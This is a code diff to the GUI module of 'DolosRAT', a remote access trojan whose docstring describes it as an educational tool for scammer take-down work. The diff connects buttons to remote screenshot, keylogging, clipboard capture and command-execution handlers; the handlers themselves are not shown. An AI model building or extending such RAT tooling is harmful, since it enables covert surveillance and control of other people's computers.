@@ -5,14 +5,18 @@
 # Created Date: 25/06/2023
 # version ='1.0'
 # ---------------------------------------------------------------------------
+# pylint: disable=relative-beyond-top-level, no-name-in-module, syntax-error
+# pylint: disable=too-many-ancestors, import-error, abstract-method
+# ---------------------------------------------------------------------------
 """
-...
+DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
+techniques frequently used within scammer take-down operations. Please note that
+the use of this tool is for educational purposes only.
 """
 
 # Built-in/Generic Imports.
-from io import BytesIO
 from typing import Any, Dict, List, Optional, Union
-from re import match
+from re import match, sub
 from pathlib import Path
 from functools import partial
 
@@ -25,22 +29,28 @@ from customtkinter import (
     CTkImage,
     CTkScrollableFrame,
     CTkTextbox,
-    StringVar)
-from PIL import Image # pylint: disable=import-error
-
+    StringVar,
+    END)
+from PIL import Image
 # Modules.
-from .buttons import DefaultButton, ListButton # pylint: disable=relative-beyond-top-level
-from ..commands.network import ( # pylint: disable=relative-beyond-top-level
-    get_ifas, # pylint: disable=no-name-in-module
-    option_change_ifa, # pylint: disable=no-name-in-module
-    btn_collect_ipv4s, # pylint: disable=no-name-in-module
-    btn_select_host, # pylint: disable=no-name-in-module
-    btn_listen, # pylint: disable=no-name-in-module
-    btn_send_command_screenshot, # pylint: disable=no-name-in-module
-    btn_send_command_keylog # pylint: disable=no-name-in-module
-) # pylint: disable=no-name-in-module
+from .buttons import DefaultButton, ListButton
+from ..commands.host import (
+    btn_send_command_screenshot,
+    btn_send_command_keylog,
+    btn_send_clipboard_keylog,
+    btn_send_command_exec
+)
+from ..commands.net import (
+    get_ifas,
+    option_change_ifa,
+    btn_collect_ipv4s,
+    btn_select_host,
+    btn_listen,
+    btn_disconnect,
+    btn_ping,
+)
 
-class TopLeftFrame(CTkFrame): # pylint: disable=too-many-ancestors
+class TopLeftFrame(CTkFrame):
     """_summary_
 
     Args:
@@ -71,7 +81,7 @@ class TopLeftFrame(CTkFrame): # pylint: disable=too-many-ancestors
         # Desktop icon.
         self._desktop_img_path: Union[None, CTkImage] = None
         # File icon.
-        self._file_img_path: Union[None, CTkImage] = None
+        self._clipboard_img_path: Union[None, CTkImage] = None
         # Keycap icon.
         self._keyboard_img_path: Union[None, CTkImage] = None
         # Command icon.
@@ -112,7 +122,11 @@ class TopLeftFrame(CTkFrame): # pylint: disable=too-many-ancestors
         self.btn_2 = DefaultButton(
             self,
             state='disabled',
-            image=self._file_img_path
+            image=self._clipboard_img_path,
+            command=partial(
+                btn_send_clipboard_keylog,
+                self.winfo_toplevel()
+            )
         )
 
         # '' button.
@@ -130,7 +144,11 @@ class TopLeftFrame(CTkFrame): # pylint: disable=too-many-ancestors
         self.btn_4 = DefaultButton(
             self,
             state='disabled',
-            image=self._cmd_img_path
+            image=self._cmd_img_path,
+            command=partial(
+                btn_send_command_exec,
+                self.winfo_toplevel()
+            )
         )
 
     def _position_widgets(self: object) -> None:
@@ -166,11 +184,11 @@ class TopLeftFrame(CTkFrame): # pylint: disable=too-many-ancestors
             size=(30, 30)
         )
 
-        self._file_img_path = CTkImage(
+        self._clipboard_img_path = CTkImage(
             dark_image=Image.open(
-                str(self._assets_dir) + '/files_img.png'
+                str(self._assets_dir) + '/clipboard_img.png'
             ),
-            size=(25, 30)
+            size=(30, 35)
         )
 
         self._keyboard_img_path = CTkImage(
@@ -187,7 +205,7 @@ class TopLeftFrame(CTkFrame): # pylint: disable=too-many-ancestors
             size=(30, 30)
         )
 
-class LeftMiddleFrame(CTkFrame): # pylint: disable=too-many-ancestors
+class LeftMiddleFrame(CTkFrame):
     """_summary_
 
     Args:
@@ -265,14 +283,22 @@ class LeftMiddleFrame(CTkFrame): # pylint: disable=too-many-ancestors
         self.btn_3 = DefaultButton(
             self,
             state='disabled',
-            image=self._ping_img_path
+            image=self._ping_img_path,
+            command=partial(
+                btn_ping,
+                self.winfo_toplevel()
+            )
         )
 
         # '' button.
         self.btn_4 = DefaultButton(
             self,
             state='disabled',
-            image=self._disconnect_img_path
+            image=self._disconnect_img_path,
+            command=partial(
+                btn_disconnect,
+                self.winfo_toplevel()
+            )
         )
 
     def _position_widgets(self: object) -> None:
@@ -331,7 +357,7 @@ class LeftMiddleFrame(CTkFrame): # pylint: disable=too-many-ancestors
             size=img_size
         )
 
-class TopRightFrame(CTkScrollableFrame): # pylint: disable=too-many-ancestors
+class TopRightFrame(CTkScrollableFrame):
     """_summary_
 
     Credit: https://github.com/TomSchimansky/"""
@@ -420,26 +446,45 @@ class TopRightFrame(CTkScrollableFrame): # pylint: disable=too-many-ancestors
         else:
             self.button_list.append(btn)
 
-    def edit_item(self: object, item: str, text: str) -> None:
+    def edit_item_connected(self: object, item: str, text: str) -> None:
         """_summary_
         """
 
         for button in self.button_list:
             if item == button.cget('text'):
-                button.configure(text=text)
+                if '[' not in item:
+                    replaced_item_text = item + text
+                else:
+                    replaced_item_text = sub(
+                        r'\[(Disconnected|Connected|Listening)\]',
+                        text,
+                        item
+                    )
+
+                    button.configure(text=replaced_item_text)
                 return
 
-    def update_connection_status(self: object, item: str) -> None:
+    def edit_item_ping(self: object, item: str, time_delta: int) -> None:
         """_summary_
 
         Args:
             self (object): _description_
             item (str): _description_
+            text (str): _description_
         """
 
         for button in self.button_list:
             if item == button.cget('text'):
-                ...
+                # Check if time delta is presently in string.
+                if 'ms]' not in item:
+                    # If not, append time delta.
+                    replaced_item_text = item + f' [{time_delta}ms]'
+                else:
+                    # Otherwise, replace with new time delta.
+                    replaced_item_text = sub(r'\ \[.*?\.ms\]', f'[{time_delta}ms]', item)
+
+                button.configure(text=replaced_item_text)
+                return
 
     def remove_item(self: object, item) -> None:
         """_summary_
@@ -454,7 +499,7 @@ class TopRightFrame(CTkScrollableFrame): # pylint: disable=too-many-ancestors
                 self.button_list.remove(button)
                 return
 
-class BottomFrame(CTkTabview): # pylint: disable=abstract-method
+class BottomFrame(CTkTabview):
     """_summary_
 
     Args:
@@ -498,7 +543,7 @@ class BottomFrame(CTkTabview): # pylint: disable=abstract-method
         self.frame_1 = TextViewerFrame(master=self.tab('Text View'))
         self.frame_2 = NaturalViewerFrame(master=self.tab('Natural View'))
 
-class TextViewerFrame(CTkTextbox): # pylint: disable=too-many-ancestors
+class TextViewerFrame(CTkTextbox):
     """_summary_
 
     Args:
@@ -528,8 +573,8 @@ class TextViewerFrame(CTkTextbox): # pylint: disable=too-many-ancestors
         )
 
         self.grid(row=0, column=0, padx=0, pady=0)
-        
-    def _add_text(self: object, text: str) -> None:
+
+    def add_text(self: object, text: str) -> None:
         """_summary_
 
         Args:
@@ -538,40 +583,22 @@ class TextViewerFrame(CTkTextbox): # pylint: disable=too-many-ancestors
         Returns:
             _type_: _description_
         """
-        
+
         self.insert('0.0', text)
 
-# class TextViewerFrame(CTkScrollableFrame): # pylint: disable=too-many-ancestors
-#     """_summary_
+    def remove_text(self: object) -> None:
+        """_summary_
 
-#     Args:
-#         CTkScrollableFrame (_type_): _description_
-#     """
+        Args:
+            self (object): _description_
 
-#     def __init__(
-#         self: object,
-#         master: Any,
-#         **kwargs: Dict[Any, Any]
-#     ) -> None:
-#         """_summary_
+        Returns:
+            _type_: _description_
+        """
 
-#         Args:
-#             self (object): _description_
-#             master (Any): _description_
-#         """
+        self.delete('0.0', END)
 
-#         super().__init__(
-#             master,
-#             width=620,
-#             height=-500,
-#             **kwargs
-#         )
-
-#         self.grid(row=0, column=0, padx=0, pady=0)
-        
-#         self.textbox: Union[None, CTkTextbox] = None
-
-class NaturalViewerFrame(CTkScrollableFrame): # pylint: disable=too-many-ancestors
+class NaturalViewerFrame(CTkScrollableFrame):
     """_summary_
 
     Args:
@@ -616,19 +643,7 @@ class NaturalViewerFrame(CTkScrollableFrame): # pylint: disable=too-many-ancesto
             size=(100, 100)
         )
 
-    def insert_img(self: object, data: bytes) -> None:
-        """_summary_
-
-        Args:
-            self (object): _description_
-        """
-
-        self.output_img = self._create_img(Image.open(
-            BytesIO(data),
-            formats=['JPEG']
-        ).convert('RGBA'))
-
-class BottomInterfaceFrame(CTkFrame): # pylint: disable=too-many-ancestors
+class BottomInterfaceFrame(CTkFrame):
     """_summary_
 
     Args:
